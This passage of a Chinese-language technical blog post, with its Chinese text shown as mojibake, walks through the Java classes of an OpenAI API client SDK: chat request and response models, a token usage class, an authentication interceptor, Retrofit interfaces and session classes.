·ä¼šæ›´å¤šçš„æ¶ˆè€—ä½ çš„ api token */</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;logit_bias&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Map logitBias;</span><br><span class="line">    <span class="comment">/** è°ƒç”¨æ ‡è¯†ï¼Œé¿å…é‡å¤è°ƒç”¨ */</span></span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Model</span> &#123;</span><br><span class="line">        <span class="comment">/** gpt-3.5-turbo */</span></span><br><span class="line">        GPT_3_5_TURBO(<span class="string">&quot;gpt-3.5-turbo&quot;</span>),</span><br><span class="line">        <span class="comment">/** GPT4.0 */</span></span><br><span class="line">        GPT_4(<span class="string">&quot;gpt-4&quot;</span>),</span><br><span class="line">        <span class="comment">/** GPT4.0 è¶…é•¿ä¸Šä¸‹æ–‡ */</span></span><br><span class="line">        GPT_4_32K(<span class="string">&quot;gpt-4-32k&quot;</span>),</span><br><span class="line">        ;</span><br><span class="line">        <span class="keyword">private</span> String code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ChatCompletionResponse-èŠå¤©å®Œæˆå“åº”"><a href="#ChatCompletionResponse-èŠå¤©å®Œæˆå“åº”" class="headerlink" title="ChatCompletionResponse(èŠå¤©å®Œæˆå“åº”)"></a>ChatCompletionResponse(èŠå¤©å®Œæˆå“åº”)</h5><p>å®šä¹‰äº†Responseä¸­çš„å‚æ•°</p><p><img src="https://pb01.s3.bitiful.net/38.png" alt="avatar"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatCompletionResponse</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** ID */</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="comment">/** å¯¹è±¡ */</span></span><br><span class="line">    <span class="keyword">private</span> String object;</span><br><span class="line">    <span class="comment">/** æ¨¡å‹ */</span></span><br><span class="line">    <span class="keyword">private</span> String model;</span><br><span class="line">    <span class="comment">/** å¯¹è¯ */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;ChatChoice&gt; choices;</span><br><span class="line">    <span class="comment">/** åˆ›å»º */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> created;</span><br><span class="line">    <span class="comment">/** è€—æ */</span></span><br><span class="line">    <span class="keyword">private</span> Usage usage;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h5><p>å®šä¹‰çš„èŠå¤©æ¶ˆæ¯å¯¹è±¡ï¼ŒåŒ…å«æ¶ˆæ¯è§’è‰²ã€æ¶ˆæ¯å†…å®¹ã€æ¶ˆæ¯åç§°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String role;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Message</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Message</span><span class="params">(Builder builder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.role = builder.role;</span><br><span class="line">        <span class="built_in">this</span>.content = builder.content;</span><br><span class="line">        <span class="built_in">this</span>.name = builder.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Builder <span class="title function_">builder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Builder</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å»ºé€ è€…æ¨¡å¼</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Builder</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String role;</span><br><span class="line">        <span class="keyword">private</span> String content;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Builder</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Builder <span class="title function_">role</span><span class="params">(Constants.Role role)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.role = role.getCode();</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Builder <span class="title function_">content</span><span class="params">(String content)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.content = content;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Builder <span class="title function_">name</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Message <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><h5 id="Usage-ä½¿ç”¨é‡"><a href="#Usage-ä½¿ç”¨é‡" class="headerlink" title="Usage(ä½¿ç”¨é‡)"></a>Usage(ä½¿ç”¨é‡)</h5><p>æ˜¯Responseä¸­çš„ä¸€ä¸ªå‚æ•°,è®°å½•äº†tokençš„ä½¿ç”¨é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Usage</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** æç¤ºä»¤ç‰Œ */</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;prompt_tokens&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> promptTokens;</span><br><span class="line">    <span class="comment">/** å®Œæˆä»¤ç‰Œ */</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;completion_tokens&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> completionTokens;</span><br><span class="line">    <span class="comment">/** æ€»é‡ä»¤ç‰Œ */</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;total_tokens&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> totalTokens;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getPromptTokens</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> promptTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPromptTokens</span><span class="params">(<span class="type">long</span> promptTokens)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.promptTokens = promptTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getCompletionTokens</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> completionTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCompletionTokens</span><span class="params">(<span class="type">long</span> completionTokens)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.completionTokens = completionTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getTotalTokens</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> totalTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTotalTokens</span><span class="params">(<span class="type">long</span> totalTokens)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.totalTokens = totalTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="OpenAiResponse"><a href="#OpenAiResponse" class="headerlink" title="OpenAiResponse"></a>OpenAiResponse</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OpenAiResponse</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String object;</span><br><span class="line">    <span class="keyword">private</span> List&lt;T&gt; data;</span><br><span class="line">    <span class="keyword">private</span> Error error;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line">        <span class="keyword">private</span> String type;</span><br><span class="line">        <span class="keyword">private</span> String param;</span><br><span class="line">        <span class="keyword">private</span> String code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="qa-é—®ç­”æ¨¡å‹"><a href="#qa-é—®ç­”æ¨¡å‹" class="headerlink" title="qa(é—®ç­”æ¨¡å‹)"></a>qa(é—®ç­”æ¨¡å‹)</h4><p><img src="https://pb01.s3.bitiful.net/40.png" alt="avatar"><br>å¾ˆå¿«å°±ä¸èƒ½ç”¨äº†,è€Œä¸”è·ŸèŠå¤©æ¨¡å‹å·®ä¸å¤š,å°±ä¸è´´ä»£ç äº†</p><h5 id="QAChoice"><a href="#QAChoice" class="headerlink" title="QAChoice"></a>QAChoice</h5><p><img src="https://pb01.s3.bitiful.net/41.png" alt="avatar"></p><h5 id="QACompletionRequest"><a href="#QACompletionRequest" class="headerlink" title="QACompletionRequest"></a>QACompletionRequest</h5><p>modelå’Œpromptå‚æ•°å¿…è¦,å…¶ä»–å‚æ•°å¯é€‰</p><p><img src="https://pb01.s3.bitiful.net/42.png" alt="avatar"></p><h5 id="QACompletionResponse"><a href="#QACompletionResponse" class="headerlink" title="QACompletionResponse"></a>QACompletionResponse</h5><p><img src="https://pb01.s3.bitiful.net/43.png" alt="avatar"></p><h3 id="interceptor"><a href="#interceptor" class="headerlink" title="interceptor"></a>interceptor</h3><h5 id="OpenAiInterceptor-è‡ªå®šä¹‰æ‹¦æˆªå™¨"><a href="#OpenAiInterceptor-è‡ªå®šä¹‰æ‹¦æˆªå™¨" class="headerlink" title="OpenAiInterceptor(è‡ªå®šä¹‰æ‹¦æˆªå™¨)"></a>OpenAiInterceptor(è‡ªå®šä¹‰æ‹¦æˆªå™¨)</h5><p>authæ–¹æ³•å°†tokenå‚æ•°åŠ å…¥urlå¯¹è±¡,è¿”å›ä¸€ä¸ªæ–°çš„è¯·æ±‚,interceptå¯¹è¯¥è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼Œç„¶åå°†å¤„ç†åçš„è¯·æ±‚ä¼ é€’ç»™ä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨ï¼ˆæˆ–ç›®æ ‡æ–¹æ³•ï¼‰ç»§ç»­å¤„ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OpenAiInterceptor</span> <span class="keyword">implements</span> <span class="title class_">Interceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** OpenAi apiKey éœ€è¦åœ¨å®˜ç½‘ç”³è¯· */</span></span><br><span class="line">    <span class="keyword">private</span> String apiKey;</span><br><span class="line">    <span class="comment">/** è®¿é—®æˆæƒæ¥å£çš„è®¤è¯ Token */</span></span><br><span class="line">    <span class="keyword">private</span> String authToken;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OpenAiInterceptor</span><span class="params">(String apiKey, String authToken)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.apiKey = apiKey;</span><br><span class="line">        <span class="built_in">this</span>.authToken = authToken;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Response <span class="title function_">intercept</span><span class="params">(Chain chain)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> chain.proceed(<span class="built_in">this</span>.auth(apiKey, chain.request()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Request <span class="title function_">auth</span><span class="params">(String apiKey, Request original)</span> &#123;</span><br><span class="line">        <span class="comment">// è®¾ç½®Tokenä¿¡æ¯ï¼›å¦‚æœæ²¡æœ‰æ­¤ç±»é™åˆ¶ï¼Œæ˜¯ä¸éœ€è¦è®¾ç½®çš„ã€‚</span></span><br><span class="line">        <span class="type">HttpUrl</span> <span class="variable">url</span> <span class="operator">=</span> original.url().newBuilder()</span><br><span class="line">                .addQueryParameter(<span class="string">&quot;token&quot;</span>, authToken)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºè¯·æ±‚</span></span><br><span class="line">        <span class="keyword">return</span> original.newBuilder()</span><br><span class="line">                .url(url)</span><br><span class="line">                .header(Header.AUTHORIZATION.getValue(), <span class="string">&quot;Bearer &quot;</span> + apiKey)</span><br><span class="line">                .header(Header.CONTENT_TYPE.getValue(), ContentType.JSON.getValue())</span><br><span class="line">                .method(original.method(), original.body())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><h5 id="IOpenAiApi"><a href="#IOpenAiApi" class="headerlink" title="IOpenAiApi"></a>IOpenAiApi</h5><p>å®šä¹‰è®¿é—®æ¥å£,ä¼ å…¥è¯·æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IOpenAiApi</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Body</span>æ³¨è§£ç”¨äºæè¿°ä¸€ä¸ªæ¥å£ä¸­çš„ä¸€ä¸ªæ–¹æ³•å‚æ•°ï¼Œè¯¥å‚æ•°å°†æ¥æ”¶è¯·æ±‚ä½“ä¸­çš„è¡¨å•æ•°æ®ã€‚</span></span><br><span class="line"><span class="comment">     * å½“å¤„ç†HTTP POSTè¯·æ±‚æ—¶ï¼Œé€šå¸¸å°†è¯·æ±‚ä½“ä¸­çš„è¡¨å•æ•°æ®æ˜ å°„åˆ°æ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ã€‚</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ–‡æœ¬é—®ç­”</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> qaCompletionRequest è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>                    è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@POST(&quot;v1/completions&quot;)</span></span><br><span class="line">    Single&lt;QACompletionResponse&gt; <span class="title function_">completions</span><span class="params">(<span class="meta">@Body</span> QACompletionRequest qaCompletionRequest)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é»˜è®¤ GPT-3.5 é—®ç­”æ¨¡å‹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chatCompletionRequest è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>                      è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@POST(&quot;v1/chat/completions&quot;)</span></span><br><span class="line">    Single&lt;ChatCompletionResponse&gt; <span class="title function_">completions</span><span class="params">(<span class="meta">@Body</span> ChatCompletionRequest chatCompletionRequest)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="OpenAiSession"><a href="#OpenAiSession" class="headerlink" title="OpenAiSession"></a>OpenAiSession</h5><p>ä¼šè¯æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OpenAiSession</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ–‡æœ¬é—®ç­”</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> qaCompletionRequest è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>                    è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    QACompletionResponse <span class="title function_">completions</span><span class="params">(QACompletionRequest qaCompletionRequest)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ–‡æœ¬é—®ç­”ï¼›ç®€å•è¯·æ±‚</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> question è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>         è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    QACompletionResponse <span class="title function_">completions</span><span class="params">(String question)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é»˜è®¤ GPT-3.5 é—®ç­”æ¨¡å‹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chatCompletionRequest è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>                      è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ChatCompletionResponse <span class="title function_">completions</span><span class="params">(ChatCompletionRequest chatCompletionRequest)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="OpenAiSessionFactory"><a href="#OpenAiSessionFactory" class="headerlink" title="OpenAiSessionFactory"></a>OpenAiSessionFactory</h5><p>ä¼šè¯å·¥å‚æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OpenAiSessionFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    OpenAiSession <span class="title function_">openSession</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h5><p>é…ç½®ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Configuration</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">private</span> String apiKey;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> String apiHost;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line"><span class="comment">//    @NotNull</span></span><br><span class="line">    <span class="keyword">private</span> String authToken;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="DefaultOpenAiSession"><a href="#DefaultOpenAiSession" class="headerlink" title="DefaultOpenAiSession"></a>DefaultOpenAiSession</h5><p>å®ç°OpenAiSessionæ¥å£</p><p>blockingGet()æ˜¯RxJavaä¸­Single<T>ä¸­çš„æ–¹æ³•,ç”¨äºå°†å½“å‰çº¿ç¨‹é˜»å¡,è¿™é‡Œçš„ä½œç”¨æ˜¯å°†å¼‚æ­¥è®¡ç®—çš„ç»“æœè½¬æ¢ä¸ºåŒæ­¥ç»“æœï¼Œä½¿å¾—è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„çº¿ç¨‹ä¼šç­‰å¾…å¼‚æ­¥è®¡ç®—å®Œæˆåæ‰ç»§ç»­æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultOpenAiSession</span> <span class="keyword">implements</span> <span class="title class_">OpenAiSession</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> IOpenAiApi openAiApi;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefaultOpenAiSession</span><span class="params">(IOpenAiApi openAiApi)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.openAiApi = openAiApi;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> QACompletionResponse <span class="title function_">completions</span><span class="params">(QACompletionRequest qaCompletionRequest)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.openAiApi.completions(qaCompletionRequest).blockingGet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> QACompletionResponse <span class="title function_">completions</span><span class="params">(String question)</span> &#123;</span><br><span class="line">        <span class="type">QACompletionRequest</span> <span class="variable">request</span> <span class="operator">=</span> QACompletionRequest</span><br><span class="line">                .builder()</span><br><span class="line">                .prompt(question)</span><br><span class="line">                .build();</span><br><span class="line">        Single&lt;QACompletionResponse&gt; completions = <span class="built_in">this</span>.openAiApi.completions(request);</span><br><span class="line">        <span class="keyword">return</span> completions.blockingGet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ChatCompletionResponse <span class="title function_">completions</span><span class="params">(ChatCompletionRequest chatCompletionRequest)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span 